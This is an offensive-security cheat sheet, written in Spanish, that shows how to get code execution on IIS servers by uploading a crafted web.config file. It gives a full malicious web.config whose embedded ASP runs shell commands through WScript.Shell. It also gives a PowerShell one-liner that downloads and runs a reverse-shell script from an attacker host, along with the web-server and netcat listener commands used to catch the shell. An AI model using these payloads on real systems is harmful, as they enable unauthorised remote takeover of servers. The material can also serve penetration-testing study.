# IIS web.config upload

Tags: #IIS

```bash 
Condiciones:
- servidor IIS
- file upload
- acceso al directorio de archivos subidos, ejemplo: (http://IP/uploadedfiles/)

Idea:
subir web.config para modificar handlers o request filtering

Resultado:
permitir ejecución de código
```

```bash 
# Extensiones a filtrar en la subida de archivos 
1. jpg, png 
2. aspx, asp
3. web.config  <-- IMPORTANTE
```

## Si puedes subir el archivo web.config y modificar handlers

* [Download-Invoke-PowershellTCP.ps1](https://gist.github.com/PwnPeter/cb3becedd8b8ce1f80e189760ddeb047)

```xml 
❯ nano web.config

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config"
           path="*.config"
           verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified"
           requireAccess="Write"
           preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
<!-- ASP code comes here!
  <%
  Set co = CreateObject("WScript.Shell")
  Set cte = co.Exec("cmd /c ping IP_Kali")
  output = cte.StdOut.Readall()
  Response.write(output)
  %>
-->
```

```bash 
❯ tcpdump -i tun0 icmp -n # Recibir el ping del comando anterior 
```

```powershell 
# Comando para descargar y ejecutar el script con la revershell 
"cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://IP_Kali/Invoke-PowershellTCP.ps1')"
```

```bash 
Paso 1:
# Descargar el archivo 'Invoke-PowershellTCP.ps1' y compartirlo 
❯ python3 -m http.server 80 

Paso 2:
❯ rlwrap nc -nlvp 443   # Colocarse en escucha para recibir la Revershell 
```